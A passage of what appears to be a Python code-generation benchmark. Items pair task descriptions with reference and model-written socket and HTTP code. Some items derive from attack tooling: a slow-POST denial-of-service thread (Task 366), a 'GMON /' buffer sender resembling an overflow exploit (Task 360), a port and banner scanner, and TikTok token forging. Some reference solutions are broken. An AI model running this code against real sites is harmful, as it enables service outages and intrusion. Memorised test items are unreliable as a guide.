    "Canonical_solution": "import socket\nimport threading\nimport select\nimport queue\nimport logging\n\nBUF_SZ = 1024\n\nclass ThreadedTCPClientSocket(threading.Thread):\n    def __init__(self, ip, port, listener_q, remote_q, config, log):\n        super(ThreadedTCPClientSocket, self).__init__()\n        self.ip = ip\n        self.port = int(port)\n        self.listener_q = listener_q\n        self.remote_q = remote_q\n        self.config = config\n        self.logger = log\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def connect(self):\n        try:\n            self.sock.connect((self.ip, self.port))\n            new_sport = self.sock.getsockname()[1]\n            return new_sport\n        except Exception as e:\n            self.logger.debug('Listener socket exception while attempting connection %s' % str(e))\n        return None\n\n    def run(self):\n        try:\n            while True:\n                readable, writable, exceptional = select.select([self.sock], [], [], .001)\n                if not self.remote_q.empty():\n                    data = self.remote_q.get()\n                    self.sock.send(data)\n                if readable:\n                    data = self.sock.recv(BUF_SZ)\n                    if data:\n                        self.listener_q.put(data)\n                    else:\n                        self.sock.close()\n                        sys.exit(1)\n        except Exception as e:\n            self.logger.debug('Listener socket exception %s' % str(e))",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport threading\nimport select\nimport queue\nimport logging\nimport time\n\nclass ThreadedTCPClientSocket(threading.Thread):\n    def __init__(self, ip, port, listener_q, remote_q, config, log):\n        super().__init__()\n        self.ip = ip\n        self.port = port\n        self.listener_q = listener_q\n        self.remote_q = remote_q\n        self.config = config\n        self.logger = log\n        self.sock = None\n        self.running = True\n        self.connect_timeout = self.config.get('connect_timeout', 5)\n        self.retry_interval = self.config.get('retry_interval', 5)\n        self.buffer_size = self.config.get('buffer_size', 4096)\n\n    def connect(self):\n        while self.running:\n            try:\n                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                self.sock.settimeout(self.connect_timeout)\n                self.sock.connect((self.ip, self.port))\n                self.sock.setblocking(False)\n                self.logger.info(f\"Connected to {self.ip}:{self.port}\")\n                return self.sock.getsockname()[1]\n            except Exception as e:\n                self.logger.error(f\"Connection failed to {self.ip}:{self.port} - {e}\")\n                if self.running:\n                    time.sleep(self.retry_interval)\n                else:\n                    break\n        return None\n\n    def run(self):\n        while self.running:\n            if not self.sock:\n                self.connect()\n                if not self.sock:\n                    continue\n\n            try:\n                rlist, wlist, xlist = select.select([self.sock], [self.sock], [self.sock], 1)\n            except Exception as e:\n                self.logger.error(f\"Select error: {e}\")\n                self.sock.close()\n                self.sock = None\n                continue\n\n            if xlist:\n                self.logger.error(\"Exception condition on socket\")\n                self.sock.close()\n                self.sock = None\n                continue\n\n            if rlist:\n                try:\n                    data = self.sock.recv(self.buffer_size)\n                    if data:\n                        self.listener_q.put(data)\n                    else:\n                        self.logger.warning(\"Server closed connection\")\n                        self.sock.close()\n                        self.sock = None\n                except Exception as e:\n                    self.logger.error(f\"Receive error: {e}\")\n                    self.sock.close()\n                    self.sock = None\n\n            if wlist:\n                try:\n                    while not self.remote_q.empty():\n                        data = self.remote_q.get_nowait()\n                        self.sock.sendall(data)\n                except queue.Empty:\n                    pass\n                except Exception as e:\n                    self.logger.error(f\"Send error: {e}\")\n                    self.sock.close()\n                    self.sock = None\n\n        if self.sock:\n            self.sock.close()\n\n    def stop(self):\n        self.running = False\n        self.join()"
  },
  {
    "Task_id": 36,
    "Instruction": "Task Description: Create a Python function that performs HTTP requests using the httpx library to fetch and process content from a given URL, with proper error handling and logging.\n\nFunction Description: The function should make a synchronous HTTP GET request to the specified URL using custom headers, handle potential exceptions, decode the response content using detected encoding, and return the extracted data along with a status code. If the request fails, it should log the error and return an error code with an empty dictionary.\n\nInput:\n- url: str | Path - The target URL to fetch content from\n- logger: logging.Logger - A logger instance for error logging\n\nOutput:\n- Tuple[int, dict] - A tuple containing:\n  - Status code (negative for errors, positive for HTTP status codes)\n  - Dictionary containing extracted data (empty if an error occurs)",
    "Canonical_solution": "import httpx\n\nheader = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/604.1 Edg/112.0.100.0'\n}\n\ndef simple_crawler(url: str | Path, logger) -> (int, dict):\n    try:\n        with httpx.Client() as client:\n            response = client.get(url, headers=header, timeout=30)\n            rawdata = response.content\n            encoding = chardet.detect(rawdata)['encoding']\n            text = rawdata.decode(encoding)\n        result = extractor.extract(text)\n    except Exception as e:\n        logger.warning(f\"cannot get content from {url}\\n{e}\")\n        return -7, {}",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "right_result": "import httpx\nimport logging\nfrom typing import Tuple, Dict, Union\nfrom pathlib import Path\n\ndef fetch_content(url: Union[str, Path], logger: logging.Logger) -> Tuple[int, Dict[str, str]]:\n    headers = {\n        \"User-Agent\": \"CustomFetcher/1.0\",\n        \"Accept-Encoding\": \"gzip, deflate, br\",\n        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\n    }\n\n    try:\n        with httpx.Client() as client:\n            response = client.get(str(url), headers=headers)\n            response.raise_for_status()\n\n            content_type = response.headers.get(\"Content-Type\", \"\")\n            encoding = response.encoding or \"utf-8\"\n\n            if \"charset=\" in content_type:\n                encoding = content_type.split(\"charset=\")[-1].strip()\n\n            decoded_text = response.content.decode(encoding, errors=\"replace\")\n\n            extracted_data = {\n                \"url\": str(url),\n                \"status_code\": response.status_code,\n                \"headers\": dict(response.headers),\n                \"content\": decoded_text[:5000],  # Limiting content for brevity\n                \"encoding\": encoding,\n            }\n\n            return response.status_code, extracted_data\n\n    except httpx.HTTPStatusError as e:\n        logger.error(f\"HTTP error occurred: {e}\")\n        return e.response.status_code, {}\n\n    except httpx.RequestError as e:\n        logger.error(f\"Request failed: {e}\")\n        return -1, {}\n\n    except UnicodeDecodeError as e:\n        logger.error(f\"Failed to decode response: {e}\")\n        return -2, {}\n\n    except Exception as e:\n        logger.exception(f\"Unexpected error: {e}\")\n        return -3, {}"
  },
  {
    "Task_id": 360,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a server, receives initial data from the server, sends a buffer with a specific prefix, and handles connection errors gracefully.\n\nFunction Description: The function `send_buffer_to_server` creates a TCP socket, connects to a specified server, receives initial data, sends a buffer prefixed with \"GMON /\", and ensures proper connection closure. It includes error handling for connection issues.\n\nInput:\n- host: [str] - The IP address or hostname of the target server\n- port: [int] - The port number on which the server is listening\n- buffer: [str] - The data buffer to be sent to the server (will be prefixed with \"GMON /\")\n\nOutput:\n- None (prints status messages to console: received data, error notifications, and confirmation of buffer sending)",
    "Canonical_solution": "import socket\n\ndef send_buffer_to_server(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print \"\\n\" + data\n        s.send(\"GMON /\" + buffer + '\\r\\n')\n    except:\n        print \"Check your debugger\"\n    finally:\n        s.close()\n        print \"Buffer Sent!\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\ndef send_buffer_to_server(host, port, buffer):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        initial_data = s.recv(1024)\n        if initial_data:\n            print(f\"Received: {initial_data.decode('utf-8', errors='ignore')}\")\n        payload = f\"GMON /{buffer}\".encode()\n        s.sendall(payload)\n        print(\"Buffer sent successfully.\")\n    except socket.error as e:\n        print(f\"Connection error: {e}\")\n    finally:\n        try:\n            s.close()\n        except:\n            pass"
  },
  {
    "Task_id": 362,
    "Instruction": "Task Description: Create a TCP client class for establishing and managing connections to a server, sending requests, and receiving responses using HDLC framing protocol.\n\nClass Description: TcpConnector is a class that handles TCP communication with a server using IPv4. It manages socket connection, sends requests with HDLC encapsulation, and continuously reads incoming data with HDLC decapsulation.\n\nAttributes:\n- socket: [socket.socket] - TCP socket object for communication\n- received_first_packet: [bool] - Flag indicating if first packet was received\n- packet_buffer: [bytes] - Buffer for storing incoming data\n- TRAILER_CHAR: [bytes] - Class constant for HDLC frame delimiter (assumed to be defined elsewhere in class)\n\nMethods:\n- __init__(address: str, port: int) -> None - Initializes TCP connection to specified address and port\n- send_request(packet_type: int, packet_payload: bytes) -> None - Sends HDLC-encapsulated request to server\n- read_loop() -> None - Continuously reads and processes incoming data using HDLC framing\n- __del__() -> None - Cleans up by closing socket connection\n- hdlc_encapsulate(data: bytes) -> bytes - (Assumed method) HDLC encapsulation implementation\n- hdlc_decapsulate(payload: bytes) -> bytes - (Assumed method) HDLC decapsulation implementation\n- dispatch_received_diag_packet(unframed_message: bytes) -> None - (Assumed method) Handles processed packets",
    "Canonical_solution": "from socket import socket, AF_INET, SOCK_STREAM\n\nclass TcpConnector:\n    def __init__(self, address: str, port: int):\n        self.socket = socket(AF_INET, SOCK_STREAM)\n        try:\n            self.socket.connect((address, port))\n        except Exception:\n            raise ConnectionError('Could not communicate with the DIAG device through TCP')\n        \n        self.received_first_packet = False\n        self.packet_buffer = b''\n\n    def send_request(self, packet_type: int, packet_payload: bytes):\n        raw_payload = self.hdlc_encapsulate(bytes([packet_type]) + packet_payload)\n        self.socket.send(raw_payload)\n\n    def read_loop(self):\n        while True:\n            while self.TRAILER_CHAR not in self.packet_buffer:\n                socket_read = self.socket.recv(1024 * 1024 * 10)\n                self.packet_buffer += socket_read\n\n            while self.TRAILER_CHAR in self.packet_buffer:\n                raw_payload, self.packet_buffer = self.packet_buffer.split(self.TRAILER_CHAR, 1)\n\n                try:\n                    unframed_message = self.hdlc_decapsulate(\n                        payload=raw_payload + self.TRAILER_CHAR\n                    )\n                except self.InvalidFrameError:\n                    continue\n                finally:\n                    self.received_first_packet = True\n\n                self.dispatch_received_diag_packet(unframed_message)\n\n    def __del__(self):\n        self.socket.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport struct\n\nclass TcpConnector:\n    TRAILER_CHAR = b'\\x7E'\n\n    def __init__(self, address: str, port: int) -> None:\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.socket.connect((address, port))\n        self.received_first_packet = False\n        self.packet_buffer = b''\n\n    def send_request(self, packet_type: int, packet_payload: bytes) -> None:\n        payload_length = len(packet_payload)\n        header = struct.pack('!BI', packet_type, payload_length)\n        data_to_send = header + packet_payload\n        hdlc_frame = self.hdlc_encapsulate(data_to_send)\n        self.socket.sendall(hdlc_frame)\n\n    def read_loop(self) -> None:\n        while True:\n            data = self.socket.recv(4096)\n            if not data:\n                break\n            self.packet_buffer += data\n            while True:\n                frame_start = self.packet_buffer.find(self.TRAILER_CHAR)\n                if frame_start == -1:\n                    break\n                self.packet_buffer = self.packet_buffer[frame_start:]\n                frame_end = self.packet_buffer[1:].find(self.TRAILER_CHAR)\n                if frame_end == -1:\n                    break\n                frame = self.packet_buffer[:frame_end + 2]\n                self.packet_buffer = self.packet_buffer[frame_end + 2:]\n                unframed = self.hdlc_decapsulate(frame)\n                if unframed:\n                    self.dispatch_received_diag_packet(unframed)\n        self.socket.close()\n\n    def __del__(self) -> None:\n        self.socket.close()\n\n    def hdlc_encapsulate(self, data: bytes) -> bytes:\n        pass\n\n    def hdlc_decapsulate(self, payload: bytes) -> bytes:\n        pass\n\n    def dispatch_received_diag_packet(self, unframed_message: bytes) -> None:\n        pass"
  },
  {
    "Task_id": 363,
    "Instruction": "Task Description: Implement a TCP client handler class that manages socket communication with a server, including sending and receiving data, handling connection states, and processing messages.\n\nClass Description: EventHandler is a TCP client handler that manages non-blocking socket communication with a server. It provides methods for sending and receiving data, handling connection states, and processing messages. The class uses threading locks to ensure thread-safe operations on the socket.\n\nAttributes:\n- _write_lock: threading.RLock - Lock for thread-safe write operations\n- _read_lock: threading.RLock - Lock for thread-safe read operations\n- address: tuple - Server address (IP, port) to connect to\n- outbuffer: bytes - Buffer for outgoing data\n- inbuffer: bytes - Buffer for incoming data\n- sock: socket.socket - TCP socket object\n- connected: bool - Connection state flag\n\nMethods:\n- __init__(address: tuple, sock: socket.socket=None) -> None - Initializes the handler with server address and optional existing socket\n- fileno() -> int - Returns socket file descriptor for select()\n- send() -> int - Sends data from outbuffer to server (returns bytes sent)\n- recv() -> None - Receives data from server and processes messages\n- push(data: bytes) -> None - Adds data to outbuffer for sending\n- handle_read(data: bytes) -> None - Abstract method to handle received data (must be implemented)\n- process_message() -> None - Abstract method to process complete messages (must be implemented)\n- ready_to_read() -> bool - Returns if ready for reading (default True)\n- ready_to_write() -> bool - Returns if ready for writing (default True)\n- close() -> None - Closes the socket connection",
    "Canonical_solution": "import os\nimport sys\nimport time\nimport errno\nimport socket\nimport select\nimport logging\nimport threading\n\nclass EventHandler:\n    def __init__(self, address: tuple, sock: socket.socket=None) -> None:\n        self._write_lock = threading.RLock()\n        self._read_lock = threading.RLock()\n        self.address = address\n        self.outbuffer = b''\n        self.inbuffer = b''\n        self.sock = sock if sock is not None else socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect(address)\n        self.connected = True\n        self.sock.setblocking(False)\n\n    def fileno(self) -> int:\n        return self.sock.fileno()\n\n    def send(self) -> int:\n        with self._write_lock:\n            while len(self.outbuffer) > 0:\n                try:\n                    sent = self.sock.send(self.outbuffer)\n                    self.outbuffer = self.outbuffer[sent:]\n                except socket.error as error:\n                    if error.args[0] == errno.EAGAIN:\n                        time.sleep(0.1)\n                    elif error.args[0] in (errno.ECONNRESET, errno.ENOTCONN, errno.ESHUTDOWN, errno.ECONNABORTED, errno.EPIPE):\n                        self.close()\n                        return 0\n                    elif os.name == 'posix':\n                        if sys.platform == 'darwin' and error.args[0] == errno.EBADF:\n                            self.close()\n                            return 0\n                        elif error.args[0] == errno.EBADFD:\n                            self.close()\n                            return 0\n                        raise\n                    else:\n                        raise\n\n    def recv(self) -> None:\n        try:\n            data = self.sock.recv(4096)\n        except socket.error as error:\n            if error.args[0] in (errno.EWOULDBLOCK, errno.EAGAIN):\n                return None\n            elif error.args[0] == errno.ECONNRESET:\n                self.close()\n                return None\n            else:\n                raise\n\n        if not data:\n            self.close()\n            return None\n\n        self.inbuffer += data\n\n        while self.inbuffer:\n            match = b'\\r\\n'\n            index = self.inbuffer.find(match)\n            if index != -1:\n                if index > 0:\n                    self.handle_read(self.inbuffer[:index])\n                self.inbuffer = self.inbuffer[index+len(match):]\n                self.process_message()\n            else:\n                index = len(match) - 1\n                while index and not self.inbuffer.endswith(match[:index]):\n                    index -= 1\n                if index:\n                    if index != len(self.inbuffer):\n                        self.handle_read(self.inbuffer[:-index])\n                        self.inbuffer = self.inbuffer[-index:]\n                    break\n                else:\n                    self.handle_read(self.inbuffer)\n                    self.inbuffer = b''\n\n    def push(self, data: bytes) -> None:\n        self.outbuffer += data\n\n    def handle_read(self, data: bytes) -> None:\n        raise NotImplementedError('You have to implement this method')\n\n    def process_message(self) -> None:\n        raise NotImplementedError('You have to implement this method')\n\n    def ready_to_read(self) -> bool:\n        return True\n\n    def ready_to_write(self) -> bool:\n        return True\n\n    def close(self) -> None:\n        self.sock.close()\n        self.connected = False",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport threading\nfrom abc import ABCMeta, abstractmethod\n\nclass EventHandler(metaclass=ABCMeta):\n    def __init__(self, address: tuple, sock: socket.socket=None) -> None:\n        self._write_lock = threading.RLock()\n        self._read_lock = threading.RLock()\n        self.address = address\n        self.outbuffer = b''\n        self.inbuffer = b''\n        self.sock = sock if sock else socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setblocking(False)\n        self.connected = False\n        if not sock:\n            try:\n                self.sock.connect(address)\n                self.connected = True\n            except BlockingIOError:\n                pass\n\n    def fileno(self) -> int:\n        return self.sock.fileno()\n\n    def send(self) -> int:\n        with self._write_lock:\n            if not self.outbuffer:\n                return 0\n            try:\n                sent = self.sock.send(self.outbuffer)\n                self.outbuffer = self.outbuffer[sent:]\n                return sent\n            except (BlockingIOError, ConnectionResetError, BrokenPipeError):\n                return 0\n\n    def recv(self) -> None:\n        with self._read_lock:\n            try:\n                data = self.sock.recv(4096)\n                if not data:\n                    self.close()\n                    return\n                self.inbuffer += data\n                self.handle_read(data)\n            except (BlockingIOError, ConnectionResetError):\n                pass\n\n    def push(self, data: bytes) -> None:\n        with self._write_lock:\n            self.outbuffer += data\n\n    @abstractmethod\n    def handle_read(self, data: bytes) -> None:\n        pass\n\n    @abstractmethod\n    def process_message(self) -> None:\n        pass\n\n    def ready_to_read(self) -> bool:\n        return True\n\n    def ready_to_write(self) -> bool:\n        return len(self.outbuffer) > 0\n\n    def close(self) -> None:\n        self.connected = False\n        try:\n            self.sock.shutdown(socket.SHUT_RDWR)\n        except OSError:\n            pass\n        self.sock.close()"
  },
  {
    "Task_id": 366,
    "Instruction": "Task Description: Create a Python class that implements a threaded TCP client for sending HTTP requests to a target server, with configurable request methods and target sites.\n\nClass Description: MyThread is a Thread subclass designed to repeatedly send HTTP requests to a specified web server. It supports different HTTP methods and includes functionality to terminate the thread. The class handles socket creation, connection establishment, request sending, and connection cleanup.\n\nAttributes:\n- method: str - The HTTP method to use for requests (e.g., GET, POST)\n- site: str - The target website domain to connect to\n- kill_received: bool - Flag to control thread termination\n\nMethods:\n- __init__(site: str, dos_type: str) -> None - Initializes the thread with target site and HTTP method\n- run() -> None - Main thread execution method that handles the TCP connection and request sending loop\n- (Inherited from Thread) start() -> None - Begins thread execution\n- (Inherited from Thread) join() -> None - Waits for thread to complete",
    "Canonical_solution": "import sys\nimport socket\nimport time\nfrom threading import Thread\n\nclass MyThread(Thread):\n    def __init__(self, site, dos_type):\n        Thread.__init__(self)\n        self.method = dos_type\n        self.site = site\n        self.kill_received = False\n\n    def run(self):\n        while not self.kill_received:\n            server = socket.gethostbyname(self.site)\n            post = 'x' * 9999\n            file = '/'\n\n            request = '%s /%s HTTP/1.1\\r\\n' % (self.method.upper(), file)\n            request += 'Host: %s\\r\\n' % (self.site)\n            request += 'User-Agent: Mozilla/5.0 (Windows; U;Windows NT 6.1; en-US; rv:1.9.2.12) Gecko/20101026Firefox/3.6.12\\r\\n'\n            request += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n'\n            request += 'Accept-Language: en-us,en;q=0.5\\r\\n'\n            request += 'Accept-Encoding: gzip,deflate\\r\\n'\n            request += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\n'\n            request += 'Keep-Alive: 9000\\r\\n'\n            request += 'Connection: close\\r\\n'\n            request += 'Content-Type: application/x-www-form-urlencoded\\r\\n'\n            request += 'Content-length: %s\\r\\n\\r\\n' % (len(post))\n\n            newrequest = '%s\\r\\n' % (post)\n            newrequest += '\\r\\n'\n\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n            try:\n                s.connect((server, 80))\n                s.send(request)\n\n                for c in newrequest:\n                    sys.stdout.write(s.send(c).__str__())\n                    time.sleep(60)\n                s.close()\n            except:\n                print \"Target Down?\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport threading\n\nclass MyThread(threading.Thread):\n    def __init__(self, site: str, dos_type: str) -> None:\n        threading.Thread.__init__(self)\n        self.method = dos_type\n        self.site = site\n        self.kill_received = False\n\n    def run(self) -> None:\n        while not self.kill_received:\n            try:\n                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                s.connect((self.site, 80))\n                if self.method == \"GET\":\n                    request = f\"GET / HTTP/1.1\\r\\nHost: {self.site}\\r\\n\\r\\n\"\n                elif self.method == \"POST\":\n                    request = f\"POST / HTTP/1.1\\r\\nHost: {self.site}\\r\\nContent-Length: 0\\r\\n\\r\\n\"\n                else:\n                    request = f\"{self.method} / HTTP/1.1\\r\\nHost: {self.site}\\r\\n\\r\\n\"\n                s.sendall(request.encode())\n                s.close()\n            except Exception as e:\n                pass  # Handle exception or log error as needed"
  },
  {
    "Task_id": 367,
    "Instruction": "Task Description: Create a TCP client class in Python that can connect to a server, send and receive data, and manage the connection lifecycle.\n\nClass Description: TCPClient is a class that implements TCP client functionality using Python's socket module. It handles connection establishment, data transmission, and connection termination with a TCP server.\n\nAttributes:\n- s: Optional[socket.socket] - The socket object used for communication, initialized as None when not connected\n\nMethods:\n- connect(host: str, port: int) -> None - Establishes a connection to the specified host and port after validating the input parameters\n- send_data(data: str) -> None - Sends UTF-8 encoded string data to the connected server\n- receive_data() -> bytes - Receives all available data from the server until the connection is closed\n- close() -> None - Closes the socket connection and resets the socket attribute\n- _dotted_quad_to_num(ip: str) -> int - (Private method) Converts a dotted quad IP address string to its integer representation",
    "Canonical_solution": "import socket\nimport re\nimport ipaddress\nfrom typing import Optional\n\nclass TCPClient:\n    def __init__(self):\n        self.s: Optional[socket.socket] = None\n\n    def connect(self, host: str, port: int) -> None:\n        \"\"\"\n        Connect to a TCP server\n        Args:\n            host: Target host IP or domain\n            port: Target port number\n        \"\"\"\n        if not re.match(r\"^\\d+$\", str(port)):\n            raise ValueError(f\"Invalid port number: {port}\")\n\n        if re.match(r\"^\\d+$\", host):\n            address = int(host)\n        elif re.match(r\"^[\\d\\.]+$\", host):\n            address = self._dotted_quad_to_num(host)\n        else:\n            raise ValueError(\"DNS resolution not implemented\")\n\n        if ipaddress.ip_address(address).is_private:\n            raise ValueError(\"Private IP addresses not allowed\")\n\n        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.s.connect((host, port))\n\n    def send_data(self, data: str) -> None:\n        \"\"\"\n        Send data to the connected server\n        Args:\n            data: String data to send\n        \"\"\"\n        if self.s:\n            self.s.send(data.encode('utf8'))\n\n    def receive_data(self) -> bytes:\n        \"\"\"\n        Receive data from the connected server\n        Returns:\n            Received bytes data\n        \"\"\"\n        if not self.s:\n            return b\"\"\n\n        data = b\"\"\n        while True:\n            packet = self.s.recv(1024)\n            if not packet:\n                break\n            data += packet\n        return data\n\n    def close(self) -> None:\n        \"\"\"\n        Close the socket connection\n        \"\"\"\n        if self.s:\n            self.s.close()\n            self.s = None\n\n    def _dotted_quad_to_num(self, ip: str) -> int:\n        \"\"\"\n        Convert decimal dotted quad string to integer\n        Args:\n            ip: IP address string\n        Returns:\n            Integer representation of IP\n        \"\"\"\n        ip32bit = socket.inet_aton(ip)\n        return struct.unpack(\"I\", ip32bit)[0]",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nfrom typing import Optional\n\nclass TCPClient:\n    def __init__(self):\n        self.s: Optional[socket.socket] = None\n\n    def connect(self, host: str, port: int) -> None:\n        if not host or not isinstance(port, int) or port < 0 or port > 65535:\n            raise ValueError(\"Invalid host or port\")\n        try:\n            ip_num = self._dotted_quad_to_num(host)\n        except (ValueError, IndexError):\n            raise ValueError(f\"Invalid IP address: {host}\")\n        \n        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.s.connect((host, port))\n\n    def send_data(self, data: str) -> None:\n        if self.s is None:\n            raise ConnectionError(\"Not connected to a server\")\n        encoded_data = data.encode('utf-8')\n        self.s.sendall(encoded_data)\n\n    def receive_data(self) -> bytes:\n        if self.s is None:\n            raise ConnectionError(\"Not connected to a server\")\n        received_data = b''\n        while True:\n            chunk = self.s.recv(4096)\n            if not chunk:\n                break\n            received_data += chunk\n        return received_data\n\n    def close(self) -> None:\n        if self.s:\n            self.s.close()\n        self.s = None\n\n    def _dotted_quad_to_num(self, ip: str) -> int:\n        octets = list(map(int, ip.split('.')))\n        if len(octets) != 4 or any(o < 0 or o > 255 for o in octets):\n            raise ValueError(\"Invalid IPv4 address\")\n        return (octets[0] << 24) | (octets[1] << 16) | (octets[2] << 8) | octets[3]"
  },
  {
    "Task_id": 369,
    "Instruction": "Task Description: Create a Python function that scans a target host and port for open TCP connections and attempts to retrieve service information from the connected port.\n\nFunction Description: The function should attempt to establish a TCP connection to the specified host and port, with a timeout of 1 second. If successful, it should try to receive initial data from the service (up to 1024 bytes). The function should process the received data by filtering non-printable characters and truncating long responses. The results should be stored in a global dictionary with information about the port's protocol, service, and state.\n\nInput:\n- target: tuple - A tuple containing (host, port) where host is the target IP address or hostname (string) and port is the target port number (integer or string)\n\nOutput:\n- None - The function doesn't return any value directly but updates the global 'results' dictionary with scan results in the format:\n  {\n      host: {\n          port: {\n              'protocol': string,\n              'service': string,\n              'state': string\n          }\n      }\n  }",
    "Canonical_solution": "import socket\nimport json\n\ndef _scan(target):\n    \"\"\"\n    Scan a target host and port for open connections and service information\n    \n    Args:\n        target (tuple): A tuple containing (host, port) to scan\n    \n    Returns:\n        None: Updates global results dictionary with scan results\n    \"\"\"\n    global ports\n    global results\n\n    try:\n        data = None\n        host, port = target\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1.0)\n        sock.connect((str(host), int(port)))\n\n        try:\n            data = sock.recv(1024)\n        except (socket.error, socket.timeout):\n            pass\n\n        sock.close()\n\n        if data:\n            data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])\n            data = data.splitlines()[0] if '\\n' in data else str(data if len(str(data)) <= 80 else data[:77] + '...')\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': data, 'state': 'open'}}\n        else:\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': ports[str(port)]['service'], 'state': 'open'}}\n\n        results.get(host).update(item)\n\n    except (socket.error, socket.timeout):\n        pass\n    except Exception as e:\n        util.log(\"{} error: {}\".format(_scan.__name__, str(e)))",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport re\n\nresults = {}\n\ndef scan_tcp_service(target):\n    host, port = target\n    if isinstance(port, str) and port.isdigit():\n        port = int(port)\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((host, port))\n        if result == 0:\n            service_info = ''\n            try:\n                sock.sendall(b'')\n                service_info = sock.recv(1024)\n                service_info = service_info.decode('utf-8', errors='ignore')\n                service_info = ''.join(c if c.isprintable() else '?' for c in service_info)\n                if len(service_info) > 100:\n                    service_info = service_info[:100] + '...'\n            except:\n                pass\n            finally:\n                sock.close()\n            protocol = \"tcp\"\n            service_name = socket.getservbyport(port, protocol).lower() if 0 < port <= 65535 else \"unknown\"\n            state = \"open\"\n        else:\n            return\n    except:\n        return\n\n    if host not in results:\n        results[host] = {}\n    results[host][port] = {\n        'protocol': protocol,\n        'service': service_name if 'service_name' in locals() else 'unknown',\n        'state': state if 'state' in locals() else 'closed'\n    }"
  },
  {
    "Task_id": 37,
    "Instruction": "Task Description: Implement a TokenManager class that handles the generation and management of various TikTok authentication tokens (msToken, ttwid, odin_tt) through HTTP requests using the httpx library.\n\nClass Description: The TokenManager class is responsible for managing TikTok authentication tokens by interacting with TikTok's API endpoints. It reads configuration from a YAML file, handles token generation (both real and fallback tokens), and manages HTTP requests with retries and proxy support.\n\nAttributes:\n- token_conf: [dict] - Configuration for msToken generation including URL, headers, and payload data\n- ttwid_conf: [dict] - Configuration for ttwid generation including URL and request data\n- odin_tt_conf: [dict] - Configuration for odin_tt generation including URL\n- proxies: [dict] - Proxy configuration for HTTP and HTTPS connections\n\nMethods:\n- __init__() -> [None] - Initializes the TokenManager by loading configuration from config.yaml\n- gen_real_msToken() -> [str] - Generates a real msToken by making a POST request to TikTok's API endpoint\n- gen_false_msToken() -> [str] - Generates a fallback msToken with random characters when real token generation fails\n- gen_ttwid(cookie: str) -> [str] - Generates a ttwid by making a POST request with the provided cookie\n- gen_odin_tt() -> [str] - Generates an odin_tt by making a GET request to TikTok's endpoint",
    "Canonical_solution": "import os\nimport json\nimport yaml\nimport httpx\nimport asyncio\nfrom typing import Union\n\nclass TokenManager:\n    def __init__(self):\n        path = os.path.abspath(os.path.dirname(__file__))\n        with open(f\"{path}/config.yaml\", \"r\", encoding=\"utf-8\") as f:\n            config = yaml.safe_load(f)\n        \n        tiktok_manager = config.get(\"TokenManager\").get(\"tiktok\")\n        self.token_conf = tiktok_manager.get(\"msToken\", None)\n        self.ttwid_conf = tiktok_manager.get(\"ttwid\", None)\n        self.odin_tt_conf = tiktok_manager.get(\"odin_tt\", None)\n        proxies_conf = tiktok_manager.get(\"proxies\", None)\n        self.proxies = {\n            \"http://\": proxies_conf.get(\"http\", None),\n            \"https://\": proxies_conf.get(\"https\", None),\n        }\n\n    def gen_real_msToken(self) -> str:\n        payload = json.dumps({\n            \"magic\": self.token_conf[\"magic\"],\n            \"version\": self.token_conf[\"version\"],\n            \"dataType\": self.token_conf[\"dataType\"],\n            \"strData\": self.token_conf[\"strData\"],\n            \"tspFromClient\": get_timestamp(),\n        })\n\n        headers = {\n            \"User-Agent\": self.token_conf[\"User-Agent\"],\n            \"Content-Type\": \"application/json\",\n        }\n\n        transport = httpx.HTTPTransport(retries=5)\n        with httpx.Client(transport=transport, proxies=self.proxies) as client:\n            try:\n                response = client.post(\n                    self.token_conf[\"url\"], headers=headers, content=payload\n                )\n                response.raise_for_status()\n                msToken = str(httpx.Cookies(response.cookies).get(\"msToken\"))\n                return msToken\n            except Exception as e:\n                logger.error(f\"\u751f\u6210TikTok msToken API\u9519\u8bef\uff1a{e}\")\n                return self.gen_false_msToken()\n\n    def gen_false_msToken(self) -> str:\n        return gen_random_str(146) + \"==\"\n\n    def gen_ttwid(self, cookie: str) -> str:\n        transport = httpx.HTTPTransport(retries=5)\n        with httpx.Client(transport=transport, proxies=self.proxies) as client:\n            try:\n                response = client.post(\n                    self.ttwid_conf[\"url\"],\n                    content=self.ttwid_conf[\"data\"],\n                    headers={\n                        \"Cookie\": cookie,\n                        \"Content-Type\": \"text/plain\",\n                    },\n                